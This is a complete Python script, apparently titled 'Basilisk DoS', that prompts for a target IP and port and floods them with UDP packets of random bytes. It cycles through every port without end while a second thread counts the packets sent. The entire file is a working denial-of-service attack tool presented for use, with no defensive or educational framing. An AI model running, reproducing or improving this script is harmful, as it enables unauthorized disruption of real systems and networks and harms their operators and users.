# requirements

import os, random, time, sys, socket, threading
from os import system, name

# define colours

cgreen = "\u001b[32m"
cred = "\u001b[31m"
cblack = "\u001b[30m"
cblue = "\u001b[34m"
ccyan = "\u001b[36m"
cmagenta = "\u001b[35m"
cwhite = "\u001b[37m"
creset = "\u001b[0m"

# clearing terminal at start

def clear():
    if name == 'nt':
        _ = system('cls')

    else:
        _ = system('clear')

clear()

# print banner

print(f"""{cred}
███   ██      ▄▄▄▄▄   ▄█ █    ▄█    ▄▄▄▄▄   █  █▀     ██▄   ████▄    ▄▄▄▄▄   
█  █  █ █    █     ▀▄ ██ █    ██   █     ▀▄ █▄█       █  █  █   █   █     ▀▄ 
█ ▀ ▄ █▄▄█ ▄  ▀▀▀▀▄   ██ █    ██ ▄  ▀▀▀▀▄   █▀▄       █   █ █   █ ▄  ▀▀▀▀▄   
█  ▄▀ █  █  ▀▄▄▄▄▀    ▐█ ███▄ ▐█  ▀▄▄▄▄▀    █  █      █  █  ▀████  ▀▄▄▄▄▀    
███      █             ▐     ▀ ▐              █       ███▀                   
        █                                    ▀                               
       ▀    """)
# request destination ip and port

print(f"{cred}")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte = os.urandom(1490)
IP = input(f"\n{cwhite}┌──({cred}Target IP:{cwhite})\n└─{cred}$ ")
PORT = int(input(f"\n{cwhite}┌──({cred}Target Port{cwhite})\n└─{cred}$ "))
packets = 0

# dos function

def dos(IP, PORT):
    print(f'\n{cred}Starting Dos...\n')
    global packets
    while True:
        s.sendto(byte, (IP, PORT))
        packets = packets + 1
        PORT = PORT + 1
        if PORT == 65535:
            PORT = 1
       
# monitoring function

def monitor():
    while True:
        time.sleep(1)
        print(f'{cwhite}Total packets sent: [{cred}{packets}{cwhite}]')
  

# start threads

threading.Thread(target=dos, args=(IP, PORT)).start()

threading.Thread(target=monitor).start()
